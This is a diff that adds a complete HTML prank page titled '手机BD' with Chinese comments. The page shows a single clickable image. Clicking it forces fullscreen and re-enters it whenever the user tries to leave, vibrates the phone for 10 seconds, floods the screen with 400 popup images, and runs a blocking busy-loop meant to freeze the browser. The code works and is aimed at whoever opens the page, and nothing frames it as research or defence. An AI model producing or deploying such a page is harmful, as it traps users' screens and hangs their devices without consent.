@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>手机BD</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #000;
+    }
+    #main-image {
+      max-width: 90%;
+      max-height: 90%;
+      cursor: pointer;
+    }
+    .popup {
+      position: absolute;
+      width: 200px;
+      height: 90px;
+    }
+    #background {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center;
+      z-index: -1;
+    }
+  </style>
+</head>
+<body>
+  <img id="main-image" src="https://i.ibb.co/PcsfSbn/image.jpg" alt="Main Image">
+  <div id="background" style="display: none; background-image: url('https://i.ibb.co/7jqcHbb/image.gif');"></div>
+
+  <script>
+    const mainImage = document.getElementById('main-image');
+    const background = document.getElementById('background');
+
+    let preventExitTimer = null;
+
+    function randomPosition() {
+      const x = Math.random() * window.innerWidth - 100; // Random X position
+      const y = Math.random() * window.innerHeight - 100; // Random Y position
+      return { x: Math.max(x, 0), y: Math.max(y, 0) };
+    }
+
+    function createPopupImage() {
+      const popup = document.createElement('img');
+      popup.src = "https://i.ibb.co/TMCxJvt/image.gif";
+      popup.classList.add('popup');
+
+      const { x, y } = randomPosition();
+      popup.style.left = `${x}px`;
+      popup.style.top = `${y}px`;
+
+      document.body.appendChild(popup);
+    }
+
+    function triggerFullScreen() {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      } else if (document.documentElement.webkitRequestFullscreen) {
+        document.documentElement.webkitRequestFullscreen();
+      } else if (document.documentElement.msRequestFullscreen) {
+        document.documentElement.msRequestFullscreen();
+      }
+    }
+
+    function preventExitFullscreen() {
+      preventExitTimer = setTimeout(() => {
+        document.removeEventListener('fullscreenchange', handleFullscreenChange);
+        clearTimeout(preventExitTimer);
+      }, 10000); // 10 秒后解除防退出逻辑
+
+      function handleFullscreenChange() {
+        if (!document.fullscreenElement) {
+          triggerFullScreen(); // 如果退出全屏，则重新进入全屏
+        }
+      }
+
+      document.addEventListener('fullscreenchange', handleFullscreenChange);
+    }
+
+    function startPopupEffect() {
+      for (let i = 0; i < 400; i++) {
+        setTimeout(createPopupImage, i * 10); // Stagger popup creation
+      }
+    }
+
+    // 启动振动效果，持续 10 秒
+    function startVibration() {
+      if (navigator.vibrate) {
+        const duration = 10000; // 振动持续时间
+        const interval = 200; // 振动间隔
+        let elapsed = 0;
+
+        const vibrationInterval = setInterval(() => {
+          navigator.vibrate(100); // 每次振动 100ms
+          elapsed += interval;
+          if (elapsed >= duration) {
+            clearInterval(vibrationInterval); // 停止振动
+          }
+        }, interval);
+      }
+    }
+
+    // 模拟高负载，增加计算压力
+    function simulateHighLoad(duration) {
+      const endTime = Date.now() + duration * 1000;
+      function heavyTask() {
+        while (Date.now() < endTime) {
+          Math.sqrt(Math.random() * Math.random());
+        }
+      }
+      setTimeout(heavyTask, 3000); // 延迟3秒后开始高负载
+    }
+
+    // 主图片点击事件处理逻辑
+    mainImage.addEventListener('click', () => {
+      mainImage.style.display = 'none'; // 隐藏主图片
+      background.style.display = 'block'; // 显示背景图片
+      triggerFullScreen(); // 进入全屏模式
+      preventExitFullscreen(); // 阻止退出全屏
+      startVibration(); // 开始振动效果
+      startPopupEffect(); // 开始弹出图片效果
+      simulateHighLoad(10); // 模拟10秒的高负载
+    });
+  </script>
+</body>
+</html>
